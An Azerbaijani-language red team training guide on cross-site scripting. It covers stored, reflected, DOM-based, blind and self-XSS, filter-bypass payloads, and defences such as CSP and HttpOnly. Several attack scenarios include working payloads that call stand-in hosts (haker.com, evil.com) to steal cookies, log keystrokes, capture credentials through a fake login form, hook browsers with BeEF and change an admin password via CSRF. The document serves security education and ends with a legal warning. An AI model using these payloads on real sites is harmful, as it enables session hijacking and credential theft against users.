# 🔴 XSS Hücumları — Geniş Red Team Təlim Materialı
**Azərbaycanca | Səviyyə: Başlanğıc → Orta**

---

## 📌 XSS Nədir?

**XSS (Cross-Site Scripting)** — hakerin zərərli JavaScript kodunu hədəf veb sayta yerləşdirərək, həmin sayta daxil olan **başqa istifadəçilərin brauzerində** bu kodu icra etdirməsi hücumudur.

Adında "Cross-Site" keçir çünki hücum bir saytdan (hakerin nəzarətindəki) başqa saytın (hədəfin) kontekstini istifadə edir. Brauzer təbiətinə görə eyni saytdan gələn koda etibar edir — XSS də məhz bu etibarı istismar edir.

> 💡 **Əsas problem:** Sayt istifadəçidən gələn məlumatı yoxlamadan birbaşa HTML-ə əlavə edir. Brauzər isə bu məlumatı mətn kimi deyil, **icra ediləcək kod** kimi görür.

**OWASP Top 10-da** XSS uzun illər üst sıralarda olub. 2021-ci ildə "Injection" kateqoriyasına daxil edilib — bu da nə qədər ciddi sayıldığını göstərir.

---

## 🧠 Brauzerin Gözü ilə: Niyə Bu İşləyir?

Brauzerin işi sadədir: serverdan gələn HTML-i oxu, render et, JavaScript-i icra et. O, "bu JavaScript hakerindən gəldi, bu isə saytdandır" deyə fərqləndirmir. Eyni saytın HTML-i içindədirsə — **icra edir**.

```html
<!-- Normal HTML -->
<p>Salam, Əli!</p>

<!-- XSS olan HTML (sayt istifadəçi adını yoxlamadan daxil etdi) -->
<p>Salam, <script>document.location='https://haker.com/?c='+document.cookie</script>!</p>
```

Brauzer `<p>` görür, render edir. `<script>` görür — **icra edir**. Cookie hakerin serverinə gedir.

---

## 🗂️ XSS Növləri — Ətraflı İzah

---

### 1. 🔴 Stored XSS (Saxlanılan / Persistent XSS)

**Necə işləyir?**
Haker zərərli kodu sayta yazır (şərh, profil adı, forum postu, mesaj və s.) — sayt bunu **verilənlər bazasına saxlayır**. Həmin məzmunu açan **hər istifadəçinin** brauzerində kod işləyir. Bir dəfə yazırsan, yüzlərlə, minlərlə insana təsir edir.

**Addım-addım ssenari:**
```
1. Haker forum şərhinə <script>...</script> yazır
2. Sayt validasiya etmədən DB-yə saxlayır
3. Admin panelini yoxlayan admin həmin şərhi açır
4. Admin-in brauzerində script işləyir
5. Admin cookie-si haker serverinə göndərilir
6. Haker admin session-u ilə sisteme girir
```

**Nümunə payload:**
```javascript
// Şərh sahəsinə yazılır
<script>
  var img = new Image();
  img.src = "https://haker.com/log?cookie=" + encodeURIComponent(document.cookie);
</script>
```

**Niyə ən təhlükəlisidir?**
Digər növlər üçün qurbanı linklə aldatmaq lazımdır. Stored XSS-də isə qurban sadəcə **saytın normal səhifəsini açır** — başqa heç nə etməsinə ehtiyac yoxdur.

**Real dünyada haralar hədəf olur:**
- Forum/blog şərh bölmələri
- İstifadəçi profil adı, bio sahələri  
- Dəstək tiket sistemləri (admin oxuyur!)
- E-ticarət məhsul rəyləri
- Chat tətbiqləri

---

### 2. 🟡 Reflected XSS (Əks olunan XSS)

**Necə işləyir?**
Zərərli kod **URL parametrinin içinə** yerləşdirilir. Server bu parametri yoxlamadan cavab HTML-inə əlavə edir. Kod saxlanılmır — hər dəfə o link açılanda "əks olunur" (reflect). Qurban həmin URL-i açmalıdır, ona görə **sosial mühəndislikdən** (phishing email, saxta SMS) istifadə edilir.

**Addım-addım ssenari:**
```
1. Saytda axtarış: example.com/search?q=iphone
   → Sayt cavabı: "iphone üçün nəticələr"
   
2. Haker URL düzəldir:
   example.com/search?q=<script>alert(document.cookie)</script>
   
3. Bu URL-i qısa link vasitəsilə gizlədib email ilə göndərir
   
4. Qurban klikləyir → brauzer URL-dəki scripti icra edir
   
5. Cookie haker serverinə gedir
```

**URL gizlətmə texnikası:**
```
Orijinal zərərli URL:
https://bank.com/search?q=<script>document.location='https://evil.com/?x='+document.cookie</script>

URL encoded:
https://bank.com/search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fevil.com%2F%3Fx%3D%27%2Bdocument.cookie%3C%2Fscript%3E

Bit.ly ilə qısaldılmış:
https://bit.ly/3xKp2mN   ← Qurban nə olduğunu görmür
```

**Reflected XSS-in ən çox istifadəsi:**
- Spear phishing (hədəflənmiş hücum)
- Korporativ emaillərdə link göndərmək
- Sosial media vasitəsilə yaymaq

---

### 3. 🟢 DOM-based XSS

**Necə işləyir?**
Bu növdə zərərli kod **serverə heç vaxt çatmır**. Hər şey brauzerin içində, JavaScript-in DOM (Document Object Model) manipulyasiyası zamanı baş verir. Saytın öz JavaScript kodu `location.hash`, `location.search`, `document.referrer` kimi mənbələrdən məlumat alıb yoxlamadan HTML-ə daxil edir.

**Nümunə — Zəif JavaScript kodu:**
```javascript
// Saytın öz kodu — URL-dəki #hash-ı oxuyub istifadəçiyə göstərir
var tema = location.hash.substring(1);
document.getElementById("baslig").innerHTML = tema;
// Əgər URL: site.com/page#<img src=x onerror=alert(1)>
// innerHTML bunu HTML kimi render edir → XSS!
```

**Ümumi DOM XSS mənbələri (sources):**
```javascript
location.href          // Tam URL
location.hash          // # sonrası hissə
location.search        // ? sonrası parametrlər
document.referrer      // Əvvəlki səhifənin URL-i
window.name            // Pəncərə adı
document.cookie        // Cookie-lər
localStorage           // Local storage
```

**Ümumi DOM XSS hədəfləri (sinks):**
```javascript
innerHTML              // ← Ən çox istismar olunan
document.write()       // ← Klassik, köhnə saytlarda var
eval()                 // ← JavaScript string-i icra edir
setTimeout("...", 0)   // ← String olaraq kod qəbul edir
location.href = "..."  // ← javascript: URL ilə
```

**Niyə xüsusidir?**
Server loglarında heç bir iz qalmır. WAF (Web Application Firewall) çox vaxt tuta bilmir çünki HTTP cavabı normal görünür — zərərli hissə brauzerdə dinamik olaraq yaranır.

---

### 4. 🕶️ Blind XSS

**Necə işləyir?**
Stored XSS-in xüsusi formudur. Haker kodu yazır, amma **özü heç vaxt nəticəni görmür** — kod başqa bir yerdə (admin panel, daxili sistem, log görüntüleyici) işləyir. Haker sadəcə "bəlkə kimsə bunu açar" ümidi ilə payload yerləşdirir və **geri çağırma (callback)** mexanizmi qurur.

**Klassik ssenari:**
```
1. Saytın "Bizimlə əlaqə" formasına ad sahəsinə yazırsan:
   "><script src="https://haker.com/blind.js"></script>

2. Bu şikayət admin panel-ə düşür
3. Admin həftələr sonra tiketi açır
4. Admin-in brauzerinde blind.js icra olunur
5. Sən bir həftə sonra haker serverindən bildiriş alırsan:
   "Admin panel-dən callback gəldi! Cookie: admin_session=xyz123"
```

**Blind XSS üçün ən populyar alət — XSS Hunter:**
```javascript
// XSS Hunter payload-u — hər şeyi toplayır
"><script src=https://xsshunter.com/seninadın></script>

// Tutduqda sənə email göndərir:
// - Hansı URL-də işlədi
// - Admin-in cookie-ləri
// - Səhifənin screenshot-u (!!)
// - Admin-in IP ünvanı
// - İstifadə etdiyi brauzerin məlumatları
```

**Blind XSS harda işləyir:**
- **Dəstək sistemləri** — müştəri şikayəti admin oxuyur
- **Feedback formları** — admin baxır
- **Log görüntüleyiciləri** — User-Agent header-ə payload
- **Email template-ləri** — veb interfeysdə render olunur
- **HR sistemləri** — CV sahəsinə yazılır, HR açır

**User-Agent-ə Blind XSS:**
```
Haker brauzerinin User-Agent-ini dəyişir:
Mozilla/5.0 <script src=https://haker.com/b.js></script>

Bu User-Agent server loguna yazılır.
Admin log analiz aləti ilə logu açanda → payload işləyir.
```

---

### 5. 🔵 Self-XSS

**Necə işləyir?**
İstifadəçinin **yalnız öz brauzerinə** təsir edən XSS. Özü-özünü hack edir, başqasına zərəri yoxdur. Texniki olaraq zəiflik deyil — amma sosial mühəndislik ilə birləşdiriləndə **çox təhlükəli** olur.

**Klassik fırıldaqçılıq ssenarisi:**
```
Facebook/Instagram-da saxta post yayılır:
"Pulsuz premium almaq üçün Developer Tools-u aç,
Console-a bu kodu yapışdır: [zərərli kod]"

İstifadəçi özü öz brauzerində kodu icra edir.
Nəticə: hesabı oğurlanır, spam göndərilir.
```

**Niyə qeyd edilir?**
Bug bounty proqramlarında adətən ödəniş verilmir (self-XSS), amma əgər CSRF ilə birləşdirilə bilərsə — tam hücuma çevrilir.

---

## 🎭 XSS Payloadları — Filtrdən Keçmə Texnikaları

Müasir saytlar `<script>` tagını bloklaya bilir. Red team olaraq bunu keçmək lazım olur:

### Əsas Test Payloadları
```javascript
// Klassik
<script>alert(1)</script>

// Script bloklanıbsa — event handler
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

// JavaScript URL
<a href="javascript:alert(1)">Klik et</a>

// Iframe
<iframe src="javascript:alert(1)">
```

### Filter Bypass Texnikaları
```javascript
// Böyük/kiçik hərf qarışığı (case insensitive bypass)
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

// HTML encoding
<script>alert&#40;1&#41;</script>
// &#40; = (    &#41; = )

// Unicode encoding
<script>\u0061lert(1)</script>
// \u0061 = a

// Double encoding
%253Cscript%253E  
// %25 = %, yəni %3C = < → double encoded: %253C

// Null byte bypass (köhnə sistemlər)
<scr\x00ipt>alert(1)</scr\x00ipt>

// Comment injection
<scr<!---->ipt>alert(1)</scr<!---->ipt>

// Nested tags (filter bir dəfə silir, qalıq işləyir)
<scr<script>ipt>alert(1)</scr</script>ipt>

// SVG + CDATA
<svg><![CDATA[<script>alert(1)</script>]]></svg>

// Template literal
<script>alert`1`</script>
// Mötərizə olmadan da işləyir!
```

### JavaScript Obfuscation
```javascript
// String-dən kod icra etmək
eval(atob("YWxlcnQoMSk="))
// atob() base64 decode edir: "YWxlcnQoMSk=" → "alert(1)"

// Parçalı string
var a="al"; var b="ert"; eval(a+b+"(1)");

// Hex kodlama
eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
// \x61 = a, \x6c = l, ... → alert(1)

// fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

---

## ⚔️ XSS ilə Nə Etmək Olar? (Real Attack Scenarios)

### 1. Session Hijacking (Ən çox istifadə edilən)
```javascript
// Qurbanın session cookie-sini oğurla
<script>
fetch('https://haker.com/steal?c=' + document.cookie);
</script>

// Sonra haker bu cookie-ni öz brauzerinə əlavə edir
// → Qurbanın hesabına giriş — şifrəsiz!
```

### 2. Keylogger (Klaviatura dinləmə)
```javascript
<script>
document.addEventListener('keydown', function(e) {
  fetch('https://haker.com/keys?k=' + e.key + '&url=' + location.href);
});
</script>
// İstifadəçi bank şifrəsi yazanda hər düymə haker serverinə gedir
```

### 3. Fake Login Form (Phishing üstüstə)
```javascript
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <h2>Sessiya başa çatdı. Yenidən daxil olun:</h2>
    <form action="https://haker.com/capture">
      <input type="text" name="user" placeholder="İstifadəçi adı">
      <input type="password" name="pass" placeholder="Şifrə">
      <button>Daxil ol</button>
    </form>
  </div>`;
</script>
// Qurban həqiqi saytdadır, amma saxta forma görür
// Şifrəsini yazıb "Daxil ol" düyməsinə basır → haker serverinə gedir
```

### 4. BeEF Framework ilə Brauzer Əsarəti
```javascript
// BeEF (Browser Exploitation Framework) hook payload-u
<script src="http://192.168.1.100:3000/hook.js"></script>

// Bu payload işlədikdən sonra haker:
// - Brauzer tarixçəsini görür
// - Şəbəkə taraması edir
// - Qurbanın kamerasına giriş cəhdi edir
// - Digər saytlara qurban adından sorğu göndərir
// - Brauzer içindəki şifrə menecerindən məlumat alır
```

### 5. XSS + CSRF Kombinasiyası
```javascript
// XSS vasitəsilə CSRF token oxu, sonra admin adından hərəkət et
<script>
fetch('/admin/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf_token" value="([^"]+)"/)[1];
    // Bu token ilə admin adından şifrə dəyiş
    fetch('/admin/change_password', {
      method: 'POST',
      body: 'new_pass=hacked123&csrf_token=' + token
    });
  });
</script>
```

### 6. Port Scanning (Daxili Şəbəkə Kəşfi)
```javascript
// XSS qurbanın brauzerini daxili şəbəkəni taramağa məcbur edir
<script>
var ips = ['192.168.1.1','192.168.1.2','192.168.1.254'];
ips.forEach(ip => {
  var img = new Image();
  img.onload = () => fetch('https://haker.com/found?ip='+ip);
  img.src = 'http://' + ip + '/favicon.ico';
});
</script>
// Qurban korporativ şəbəkədədirsə → daxili serverləri kəşf edirsən
```

---

## 🔍 XSS Test Metodologiyası

Red team kimi bir saytı test edərkən izlənilən yol:

### Mərhələ 1: Giriş Nöqtələrini Tap
```
Hər yerə bax:
□ Axtarış sahələri
□ Şərh / forum sahələri  
□ Profil adı, bio, ünvan sahələri
□ URL parametrləri (?q=, ?id=, ?page=)
□ HTTP Header-lər (User-Agent, Referer, X-Forwarded-For)
□ JSON/XML API parametrləri
□ File upload (fayl adı!)
□ 404 səhifələri (URL sayta əks olunursa)
□ Error mesajları (input içinə alınırsa)
```

### Mərhələ 2: Reflection Yoxla
```javascript
// Əvvəl sadə, unikal string daxil et
test1337xss

// Saytın cavabında bu string görünürmü?
// Hansı kontekstdə görünür?
```

### Mərhələ 3: Konteksti Anla
```html
<!-- HTML konteksti — tag açmaq lazımdır -->
<p>SƏNİN_INPUTUN_BURADADIR</p>
Payload: <img src=x onerror=alert(1)>

<!-- Attribute konteksti — attribute-dan çıxmaq lazımdır -->
<input value="SƏNİN_INPUTUN_BURADADIR">
Payload: "><img src=x onerror=alert(1)>

<!-- JavaScript string konteksti — stringdən çıxmaq lazımdır -->
<script>var x = "SƏNİN_INPUTUN_BURADADIR"</script>
Payload: ";alert(1);//

<!-- HTML attribute-da JavaScript -->
<a href="javascript:SƏNİN_INPUTUN_BURADADIR">
Payload: alert(1)
```

### Mərhələ 4: Filter Test Et
```
1. <script>alert(1)</script>  → Bloklandı?
2. <img src=x onerror=alert(1)>  → Bloklandı?
3. Böyük hərflə <IMG>  → Bloklandı?
4. HTML encoded &#60;script&#62;  → Keçdi?
5. Double encoded %253Cscript  → Keçdi?
```

### Mərhələ 5: Proof of Concept
Bug bounty / pentest üçün `alert(1)` kifayət deyil — daha ciddi göstər:
```javascript
// document.domain göstər — eyni origin-dən işlədiyini sübut et
alert(document.domain)

// Cookie oxu — real təhlükəni göstər
alert(document.cookie)
```

---

## 🛠️ XSS Alətləri

| Alət | İstifadə | Link |
|------|----------|------|
| **Burp Suite** | Proxy, intercept, scanner | portswigger.net |
| **XSS Hunter** | Blind XSS üçün callback | xsshunter.com |
| **BeEF** | Brauzer istismarı | beefproject.com |
| **DOMXSSscanner** | DOM-based tarama | domxssscanner.com |
| **XSStrike** | Fuzzing + payload gen | github.com/s0md3v/XSStrike |
| **Dalfox** | Sürətli XSS tarayıcı | github.com/hahwul/dalfox |

---

## 🛡️ Müdafiə Tədbirləri (Blue Team Baxışı)

Red team olaraq bunları bilmək vacibdir — çünki bunları keçmək lazımdır:

### Output Encoding
```javascript
// Zəif — birbaşa HTML-ə əlavə edir
element.innerHTML = userInput;

// Güclü — mətn kimi əlavə edir, kod kimi yox
element.textContent = userInput;

// Server tərəfdə HTML encoding
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
& → &amp;
/ → &#x2F;
```

### Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

// Bu header ilə:
// - Yalnız eyni saytdan skriptlər icra olunur
// - Inline <script> bloklanır (nonce olmadan)
// - eval() bloklanır
```

### CSP Bypass (Red team üçün)
```javascript
// CSP varsa belə keçmə yolları:
// 1. Saytın özünün CDN-i whitelist-dədirsə
<script src="https://cdn.example.com/angular.js">
</script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>

// 2. JSONP endpoint varsa whitelist-dəki domenda
<script src="https://apis.google.com/js/platform.js?onload=alert(1)">

// 3. unsafe-inline varsa — artıq tamamilə keçir
```

### HttpOnly Cookie
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// HttpOnly — JavaScript document.cookie ilə oxuya bilmir
// Amma fetch() ilə Cookie header avtomatik göndərilir → CSRF mümkündür
```

---

## 🎯 XSS vs Digər Hücumlarla Müqayisə

| Xüsusiyyət | XSS | SQLi | CSRF |
|------------|-----|------|------|
| **Hücum yeri** | Brauzer | Server/DB | Server |
| **Nə oğurlanır** | Session, məlumat | DB məlumatı | Hərəkət edilir |
| **Ehtiyac** | Qurban saytı açsın | Birbaşa sorğu | Qurban link açsın |
| **Effekt** | Client-side | Server-side | Server-side |

---

## 📊 XSS Növlərinin Müqayisəsi

| Xüsusiyyət | Stored | Reflected | DOM-based | Blind |
|------------|--------|-----------|-----------|-------|
| DB-ə saxlanılır? | ✅ | ❌ | ❌ | ✅ |
| Serverə gedir? | ✅ | ✅ | ❌ | ✅ |
| Haker görür? | ✅ | ✅ | ✅ | ❌ |
| Avtomatik yayılır? | ✅ | ❌ | ❌ | ❌ |
| WAF tutur? | Bəzən | Bəzən | Çətin | Çətin |
| Aşkarlanması | Orta | Asan | Çətin | Çox çətin |
| Təhlükə səviyyəsi | 🔴 Yüksək | 🟡 Orta | 🟡 Orta | 🔴 Yüksək |

---

## 🏁 Öyrənmə Yolu

### Praktik Laboratoriyalar (Pulsuz)
```
1. PortSwigger Web Security Academy
   → labs.portswigger.net
   → XSS üzrə 30+ lab, ən yaxşı mənbədir
   
2. OWASP WebGoat
   → github.com/WebGoat/WebGoat
   → Özün qur, praktik et

3. DVWA (Damn Vulnerable Web Application)
   → github.com/digininja/DVWA
   → Docker ilə asanlıqla qur

4. HackTheBox / TryHackMe
   → Əsl hücum ssenarisi
```

### Tövsiyə olunan oxu sırası
```
1. OWASP XSS Prevention Cheat Sheet
2. PortSwigger XSS Tutorial (bütün bölmələr)
3. The Web Application Hacker's Handbook (kitab)
4. PayloadsAllTheThings (GitHub) — payload kolleksiyası
```

### Bug Bounty Başlanğıcı
```
HackerOne → h1.com
Bugcrowd  → bugcrowd.com

İlk hədəf üçün:
- Scope-a bax, hansı domenlər icazəlidir
- Sadə Reflected XSS ilə başla
- alert(document.domain) işlədəndə report yaz
```

---

## ⚠️ Qanuni Xəbərdarlıq

Bu materialda öyrəndiklərini **yalnız**:
- Öz test mühitində (DVWA, WebGoat)
- İcazə verilmiş bug bounty proqramlarında
- Pentest müqaviləsi olan sistemlərdə

tətbiq et. İcazəsiz sistemlərə hücum **cinayət sayılır**.

---

*📝 Hazırlandı: Red Team Təlim Materialı | XSS — Orta Səviyyə | v2.0*
